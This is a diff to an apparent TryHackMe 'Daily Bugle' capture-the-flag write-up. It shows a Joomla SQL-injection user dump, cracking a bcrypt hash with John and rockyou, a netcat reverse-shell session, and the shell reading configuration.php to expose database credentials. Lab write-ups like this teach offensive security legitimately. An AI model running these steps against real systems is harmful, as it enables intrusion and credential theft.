@@ -133,18 +133,233 @@ https://github.com/XiphosResearch/exploits/blob/master/Joomblah/joomblah.py
 
 ![image](https://github.com/user-attachments/assets/4b598160-0961-4e53-a8c8-e244c07fd52b)
 
+<br>
+
+<pre><code>Found user ['811', 'Super User', 'jonah', 'jonah@tryhackme.com', '$2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm', '', '']</code></pre>
+
+<br>
+
+<pre><code>https://hashcat.net/wiki/doku.php?id=example_hashes</code></pre>
+
+<br>
+
+![image](https://github.com/user-attachments/assets/5169dc4d-ee4c-4265-8445-3816871e1cb9)
+
+
+<br>
+
+<pre><code>root@[THM AttackBox]:~/DailyBugle# john --format=bcrypt hash --wordlist=/usr/share/wordlists/rockyou.txt
+
+
+
+</code></pre>
 
 
 
 <br>
 
-<pre><code>apt install sqlmap
-...
-...
-  
+
+
+<p>Jonah’s password is <code>spideran123</code>.</p>
+
+![image](https://github.com/user-attachments/assets/66cedcbc-fa8c-4349-8175-bed6f3dd0e78)
+
+
+<br>
+
+![image](https://github.com/user-attachments/assets/4c5dd6ab-d8d3-412d-8bf9-4bfef0494c4e)
+
+
+<br>
+
+![image](https://github.com/user-attachments/assets/42e05f15-b91c-41b2-8d62-7a7dc53125a8)
+
+
+<br>
+
+![image](https://github.com/user-attachments/assets/666711c6-ea0d-4a3d-b3f2-163f7b5721a5)
+
+<br>
+
+
+
+![image](https://github.com/user-attachments/assets/20869614-42a2-41ca-82b9-a522ca6ef4fb)
+
+
+<br>
+
+![image](https://github.com/user-attachments/assets/56cd7a47-d36b-41e0-a1d6-1eb13a91e891)
+
+<br>
+
+![image](https://github.com/user-attachments/assets/7c9691df-3e32-4c35-a405-1dc66f940b98)
+
+<br>
+
+![image](https://github.com/user-attachments/assets/40fc3316-2c4c-4077-b051-39b44a92e6ee)
+
+<br>
+
+
+![image](https://github.com/user-attachments/assets/39013650-c2d7-4ecc-b1a2-2d68bcc3d5e7)
+
+<br>
+
+![image](https://github.com/user-attachments/assets/ea86e19c-e703-46b7-b4d1-d3a5ef70708d)
+
+<br>
+
+![image](https://github.com/user-attachments/assets/df222ecf-c4cb-4b08-94f5-daaf4fc83ec2)
+
+<br>
+
+![image](https://github.com/user-attachments/assets/78b7b71c-29fc-4397-99e4-470f58b0296c)
+
+<br>
+
+<pre><code>root@ip-10-10-38-201:~/DailyBugle# nc -nlvp 1234
+Listening on 0.0.0.0 1234
+Connection received on 10.10.41.192 46164
+Linux dailybugle 3.10.0-1062.el7.x86_64 #1 SMP Wed Aug 7 18:08:02 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
+ 22:48:12 up  2:20,  0 users,  load average: 0.00, 0.03, 0.05
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=48(apache) gid=48(apache) groups=48(apache)
+sh: no job control in this shell
+sh-4.2$ ls
+ls
+bin
+boot
+dev
+etc
+home
+lib
+lib64
+media
+mnt
+opt
+proc
+root
+run
+sbin
+srv
+sys
+tmp
+usr
+var
+sh-4.2$ cd /var
+cd /var
+sh-4.2$ cd www
+cd www
+sh-4.2$ cd html
+cd html
+sh-4.2$ ls
+ls
+LICENSE.txt
+README.txt
+administrator
+bin
+cache
+cli
+components
+configuration.php
+htaccess.txt
+images
+includes
+index.php
+language
+layouts
+libraries
+media
+modules
+plugins
+robots.txt
+templates
+tmp
+web.config.txt
+sh-4.2$ at configuration.php
+at configuration.php
+sh: at: command not found
+sh-4.2$ cat configuration.php
+cat configuration.php
+<?php
+class JConfig {
+	public $offline = '0';
+	public $offline_message = 'This site is down for maintenance.<br />Please check back again soon.';
+	public $display_offline_message = '1';
+	public $offline_image = '';
+	public $sitename = 'The Daily Bugle';
+	public $editor = 'tinymce';
+	public $captcha = '0';
+	public $list_limit = '20';
+	public $access = '1';
+	public $debug = '0';
+	public $debug_lang = '0';
+	public $dbtype = 'mysqli';
+	public $host = 'localhost';
+	public $user = 'root';
+	public $password = 'nv5uz9r3ZEDzVjNu';
+	public $db = 'joomla';
+	public $dbprefix = 'fb9j5_';
+	public $live_site = '';
+	public $secret = 'UAMBRWzHO3oFPmVC';
+	public $gzip = '0';
+	public $error_reporting = 'default';
+	public $helpurl = 'https://help.joomla.org/proxy/index.php?keyref=Help{major}{minor}:{keyref}';
+	public $ftp_host = '127.0.0.1';
+	public $ftp_port = '21';
+	public $ftp_user = '';
+	public $ftp_pass = '';
+	public $ftp_root = '';
+	public $ftp_enable = '0';
+	public $offset = 'UTC';
+	public $mailonline = '1';
+	public $mailer = 'mail';
+	public $mailfrom = 'jonah@tryhackme.com';
+	public $fromname = 'The Daily Bugle';
+	public $sendmail = '/usr/sbin/sendmail';
+	public $smtpauth = '0';
+	public $smtpuser = '';
+	public $smtppass = '';
+	public $smtphost = 'localhost';
+	public $smtpsecure = 'none';
+	public $smtpport = '25';
+	public $caching = '0';
+	public $cache_handler = 'file';
+	public $cachetime = '15';
+	public $cache_platformprefix = '0';
+	public $MetaDesc = 'New York City tabloid newspaper';
+	public $MetaKeys = '';
+	public $MetaTitle = '1';
+	public $MetaAuthor = '1';
+	public $MetaVersion = '0';
+	public $robots = '';
+	public $sef = '1';
+	public $sef_rewrite = '0';
+	public $sef_suffix = '0';
+	public $unicodeslugs = '0';
+	public $feed_limit = '10';
+	public $feed_email = 'none';
+	public $log_path = '/var/www/html/administrator/logs';
+	public $tmp_path = '/var/www/html/tmp';
+	public $lifetime = '15';
+	public $session_handler = 'database';
+	public $shared_session = '0';
+}sh-4.2$ 
+
 </code></pre>
 
 <br>
+
+![image](https://github.com/user-attachments/assets/54f3164c-19e5-4ad7-8442-5e0c2d8ff638)
+
+
+
+
+
+
+
+
+
 
 
 
